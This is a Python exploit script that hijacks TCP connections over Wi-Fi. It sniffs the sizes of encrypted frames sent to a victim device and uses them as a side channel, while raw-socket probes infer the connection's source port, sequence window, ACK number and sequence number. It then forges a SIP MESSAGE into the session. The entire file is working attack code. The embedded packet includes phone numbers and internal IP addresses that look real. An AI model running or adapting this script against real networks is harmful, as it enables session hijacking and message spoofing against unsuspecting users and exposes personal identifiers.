import time
import threading
import subprocess
from utils.rawsockets import Rawsockets

src_ip = "x.x.x.x"                # need to change
dst_ip = "x.x.x.x"                # need to change
NIC = "eth0"                      # need to change
victim_mac = "xx:xx:xx:xx:xx:xx"  # need to change
dst_port = 22                     # this port should choose by service
src_port = 12345                  # this param should be inferred

seq_num = 123456                  # this param should be inferred
ack_num = 123456                  # this param should be inferred
challenge_ack_num = 123456        # this param should be inferred
inw_seq = 123456                  # this param should be inferred
inw_ack = 123456                  # this param should be inferred
WIFI_HEADER_LENGTH = 117          # need to modify by packet capture
CHALLENGE_ACK_LENGTH = 129        # need to modify by packet capture
default_window_size = 60000       # default window size
all_time = 0

def listen_packets(packet_lengths, lock):
    global victim_mac, NIC
    cmd = f"sudo tshark -i {NIC} -Y \"(wlan.fc.type == 2) && (wlan.da == {victim_mac})\" -T fields -e frame.len -l"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("start listening")
    try:
        while True:
            line = proc.stdout.readline()
            if line:
                packet_length = int(line.strip())
                with lock:
                    packet_lengths.append(packet_length)
    finally:
        proc.terminate()


def check_consecutive_lengths(analyze_list):
    if len(analyze_list) < 1:
        return False, None
    else:
        analyze_list.sort(reverse=True)
        return True, analyze_list[0]


def guess_src_port():
    """
    Port range:
        linux: 32768 - 61000
        windows: 49152 - 65535
    This function is used to guess the src port of the victim one by one.
    """
    global src_port, dst_port, lock, packet_lengths, all_time
    packets_per_group = 1460
    
    start_port = 32768
    end_port = 65535
    send_count = 2
    
    with lock:
        packet_lengths[:] = []
    reversed_rs = Rawsockets(dst_ip.encode('utf-8'), src_ip.encode('utf-8'))
    tt1 = time.time()
    for group_start in range(start_port, end_port + 1, packets_per_group):
        group_end = min(group_start + packets_per_group - 1, end_port)
        
        nums = []
        for i in range(group_start, group_end + 1):
            nums.append(i)
        min_length = 0
        max_length = len(nums)
        reversed_rs.send_parallel_tcp_data(dst_port, nums, seq_num, ack_num, min_length, max_length, send_count) 
        
        time.sleep(1)
        # print(group_start, group_end + 1, packet_lengths)
        found, packet_size = check_consecutive_lengths(packet_lengths)
        
        if found:
            src_port = packet_size - (WIFI_HEADER_LENGTH) + group_start - 1
            all_time += time.time() - tt1
            print("[+] Time for guess src port: %s" % (all_time))
            print("[+] Guess src port: %s" % (src_port))
            # check for src port
            break
    
    with lock:
        packet_lengths[:] = []
    reversed_rs.send_parallel_tcp_data(dst_port, [src_port], seq_num, ack_num, min_length, max_length, send_count) 
    time.sleep(2)
    checked, _ = check_consecutive_lengths(packet_lengths)
    if checked:
        print("[+] Checked src port right")
    else:
        print("[-] Checked src port error!!")
        exit(0)
    
    del(reversed_rs)

def guess_src_port_multi_bin():
    """
    This function is used to guess the src port of the victim by multi_bin.
    """
    global src_port, dst_port, lock, packet_lengths, all_time
    start_port = 32768
    end_port = 65535
    bin_num = 64
    one_round_per_bin = 16
    time_per_round = 2
    port_range = list(range(start_port, end_port))
    ports_per_bin = len(port_range) // bin_num
    bins = []

    for i in range(bin_num):
        start = i * ports_per_bin
        if i == bin_num - 1:
            end = len(port_range)
        else:
            end = start + ports_per_bin
        bins.append(port_range[start:end])

    reversed_rs = Rawsockets(dst_ip.encode('utf-8'), src_ip.encode('utf-8'))
    tt1 = time.time()
    # phase 1 -> know what bin have the correct Port
    which_bin = 0
    for round in range(bin_num // one_round_per_bin + 1):
        current_ports = []
        padding_lengths = []
        for i in range(round * one_round_per_bin, min((round + 1) * one_round_per_bin, bin_num)):
            current_ports += bins[i]
            padding_lengths += [i - round * one_round_per_bin] * len(bins[i])
        
        with lock:
            packet_lengths[:] = []
        reversed_rs.send_parallel_tcp_data(dst_port, current_ports, seq_num, ack_num, padding_lengths)
        time.sleep(time_per_round)
        found, packet_size = check_consecutive_lengths(packet_lengths)
        if found:
            which_bin = packet_size - (WIFI_HEADER_LENGTH) + round * one_round_per_bin - 1
            break
    
    # phase 2 -> know what Port is
    current_ports = bins[which_bin]
    padding_lengths = range(len(current_ports))
    with lock:
        packet_lengths[:] = []
    reversed_rs.send_parallel_tcp_data(dst_port, current_ports, seq_num, ack_num, padding_lengths)
    time.sleep(time_per_round)
    found, packet_size = check_consecutive_lengths(packet_lengths)
    if found:
        src_port = current_ports[packet_size - (WIFI_HEADER_LENGTH) - 1]
        all_time += time.time() - tt1
        print("[+] Time for guess src port: %s" % (all_time))
        print("[+] Guess src port: %s" % (src_port))
    
        with lock:
            packet_lengths[:] = []
        reversed_rs.send_parallel_tcp_data(dst_port, [src_port], seq_num, ack_num, [1]) 
        time.sleep(time_per_round)
        
        checked, _ = check_consecutive_lengths(packet_lengths)
        if checked:
            print("[+] Checked src port right")
        else:
            print("[-] Checked src port error!!")
            exit(0)
    else:
        print("error, not found Port in bin")
        exit(0)
    del(reversed_rs)
  
def check_challenge_ack(analyze_list):
    if CHALLENGE_ACK_LENGTH not in analyze_list:
        return False
    else:
        return True

def guess_seq_window():
    """
    This function is used to guess the sequence window of the victim.
    """
    global src_port, dst_port, inw_seq, all_time, lock, packet_lengths
    
    rs = Rawsockets(src_ip.encode('utf-8'), dst_ip.encode('utf-8'))
    def _send(nums):
        rs.send_parallel_rst(src_port, dst_port, nums, 0)
    
    total_nums = [i for i in range(0, 2**32, default_window_size)]
    
    # 16 * 1024
    per_num = 5 * 512
    
    seq_list = []
    for i in range(0, len(total_nums), per_num):
        seq_list.append(total_nums[i : min(i + per_num, len(total_nums))])
    
    t1 = time.time()
    i = 0
    cur_lists = []
    
    while i < len(seq_list):
        with lock:
            packet_lengths[:] = []

        _send(seq_list[i])
        time.sleep(1)

        if check_challenge_ack(packet_lengths):
            cur_lists = seq_list[i]
            break
        else:
            i += 1
    if cur_lists == []:
        print("[-] Guess seq window failed")
        exit(0)
    t2 = time.time()
    print("[+] Time for linear search: %s" % (t2 - t1))
    
    ll = 0
    rr = len(cur_lists)

    while True:
        if (rr - ll) == 1:
            break
        mm = (ll + rr) // 2
        ll_lists = cur_lists[ll : mm]
        with lock:
            packet_lengths[:] = []    
        _send(ll_lists)
        time.sleep(1.2)
        if check_challenge_ack(packet_lengths):
            rr = mm
        else:
            ll = mm

    t3 = time.time()
    all_time += t3 - t1
    print("[+] Time for guess seq window: %s" % (t3 - t1))
    print("[+] Guess seq window: %s" % (cur_lists[ll]))
    inw_seq = cur_lists[ll]
    with lock:
        packet_lengths[:] = []
    _send([inw_seq])
    time.sleep(1)
    if check_challenge_ack(packet_lengths):
        print("[+] Checked seq window right")
    else:
        print("[-] Checked seq window error!!")
        exit(0)
    del(rs)


def guess_ack_window():
    """
    ACK have three conditions:
    1 the acknowledgment number in challenge ACK window -> send challenge ACK
    2 in the acceptable ACK range -> accept the packet
    3 invalid acknowledgment numbers -> discard the packet

    conditions 2 and conditions 3 are not distinguishable, so we can only guess the challenge ACK window.
    and then use the binary search to guess edge of the challenge ACK window.
    the edge have two possibilities: 
    1. the edge is the edge of the acceptable ACK range -> SND.UNA - SND.MAX.WND
    2. the edge is the edge of the invalid ACK range -> SND.UNA - 2G
    so we could use the binary search to guess SND.UNA which also the acceptable ack. 
    
    Time:
        step1: [0, 1G, 2G, 3G]; 4 times
        step2: binary search 1G = 2 ^ 30, send mid_ack, 30 times
        about 34 seconds,

    """
    rs = Rawsockets(src_ip.encode('utf-8'), dst_ip.encode('utf-8'))
    global src_port, dst_port, inw_seq, ack_num, lock, packet_lengths, all_time, challenge_ack_num
    g_acks = [1, 0, 0x40000000, 0x80000000, 0xc0000000]
    una_ack = 0

    def _send(nums):
        rs.send_parallel_psh_ack(src_port, dst_port, inw_seq, nums)    
    
    t1 = time.time()
    i = 0
    while i < 5:
        with lock:
            packet_lengths[:] = []
        _send([g_acks[i]])
        
        time.sleep(1)
        if check_challenge_ack(packet_lengths):
            challenge_ack_num = g_acks[i]
            break
        i += 1

    if challenge_ack_num == 0:
        with lock:
            packet_lengths[:] = []
        _send([0xc0000000])
        time.sleep(1)
        if check_challenge_ack(packet_lengths):
            challenge_ack_num = 0xc0000000
    
    t2 = time.time()
    print("[+] Time for start search: %s" % (t2 - t1))
    print("[+] Guess challenge ack: %s" % (challenge_ack_num))
    
    ll = challenge_ack_num - 0x40000000
    rr = challenge_ack_num
    
    while rr - ll > 1:
        mm = (ll + rr) // 2
                
        with lock:
            packet_lengths[:] = []
        if mm < 0:
            _send([mm + 0x100000000])
        else:
            _send([mm])
        time.sleep(1)

        if check_challenge_ack(packet_lengths):
            rr = mm
        else:
            ll = mm
    
    if ll >= 0x7FFFFFFF:  # (2 ** 31 - 1)
        una_ack = ll - 0x7FFFFFFF
    else:
        una_ack = ll + 0x100000000 - 0x7FFFFFFF
    
    ack_num = una_ack

    t3 = time.time()
    print("[+] Time for guess ack: %s" % (t3-t1))
    all_time += t3 - t1
    print("[+] Guess accepted ack: %s" % (una_ack))
    
    del(rs)


def guess_seq_num():
    """
        same as guess ack num
    """
    global src_port, dst_port, challenge_ack_num, seq_num, inw_seq, lock, packet_lengths, all_time
    
    rs = Rawsockets(src_ip.encode('utf-8'), dst_ip.encode('utf-8'))
    def _send(num):
        rs.send_parallel_ack_data(src_port, dst_port, num, challenge_ack_num, b'a')
    
    ll = max(inw_seq - default_window_size, 0)
    rr = inw_seq
    t1 = time.time()
    while rr - ll > 1:
        mm = (ll + rr) // 2

        with lock:
            packet_lengths[:] = []
        
        _send(mm)
        time.sleep(1)
        
        print(f"Current range: {rr - ll}, Current mm: {mm}, flag:{packet_lengths}")
        if check_challenge_ack(packet_lengths):
            rr = mm
        else:
            ll = mm
    
    t2 = time.time()
    print("[+] Time for guess seq: %s" % (t2 - t1))
    all_time += t2 - t1
    print(f"[+] Got seq number: {ll + 2}")
    seq_num = ll + 2
    with lock:
        packet_lengths[:] = []
    
    _send(mm)
    _send(mm)
    _send(mm)
    time.sleep(1)
    
    if len(packet_lengths) > 1:
        print("[+] Checked seq right")
    else:
        print("[-] Checked seq error!!")
    
    del(rs)

def inject():
    global src_ip, dst_ip, src_port, dst_port, seq_num, ack_num
    reversed_rs = Rawsockets(dst_ip, src_ip, 1)
    # sip message need change by yourself
    data = b"MESSAGE sip:+8618210242814@10.139.164.181:38623;transport=TCP SIP/2.0\r\nVia: SIP/2.0/TCP 117.136.239.1:5460;branch=z9hG4bK-*29*-1-234205ad3644b218a4f5taN1\r\nTo: <tel:+8618210242814>\r\nFrom: <tel:+8618801286620>;tag=hyjjxh154.112.0.1.657254892.118154676357\r\nCall-ID: 1817753651j154.112.37952045@10.188.40.61\r\nCSeq: 100 MESSAGE\r\nMax-Forwards: 68\r\nP-Asserted-Identity: <tel:+8618801286620>\r\nUser-Agent: CPM-serv/OMA2.2 RCS-serv/UP_2.3\r\nP-Asserted-Service: urn:urn-7:3gpp-service.ims.icsi.oma.cpm.msg\r\nContribution-ID: ec1d9638-f7cd-1038-9be9-a9c315c70d3a\r\nConversation-ID: 0b20864a-5569-478a-be08-509357ec619d\r\nDate: Sat, 24 Oct 2020 02:24:11 GMT\r\nAccept-Contact: *;+g.3gpp.icsi-ref=\"urn%3Aurn-7%3A3gpp-service.ims.icsi.oma.cpm.msg\"\r\nContent-Type: message/cpim\r\nContent-Length: 380\r\n\r\nFrom: <sip:+8618801286620@bj.ims.mnc000.mcc460.3gppnetwork.org>\r\nTo: <tel:+8618210242814>\r\nNS: imdn<urn:ietf:params:imdn>\r\nimdn.Message-ID: ec1d7cf0-f7cd-1038-908d-8b757c563a3f\r\nDateTime: 2020-10-24T10:24:11.270+08:00\r\nimdn.Disposition-Notification:  display, interworking\r\n\r\nContent-Transfer-Encoding: base64\r\nContent-Type: text/plain;charset=UTF-8\r\nContent-Length: 8\r\n\r\nTGFsYWxh"
    reversed_rs.send_parallel_ack_data(dst_port, src_port, ack_num, seq_num, data)
    del(reversed_rs)


if __name__ == "__main__":
    packet_lengths = []
    lock = threading.Lock()
    listen_thread = threading.Thread(target=listen_packets, args=(packet_lengths, lock))
    listen_thread.start()
    guess_src_port_multi_bin()
    guess_seq_window()
    guess_ack_window()
    guess_seq_num()
    inject()

    print("all time: ", all_time)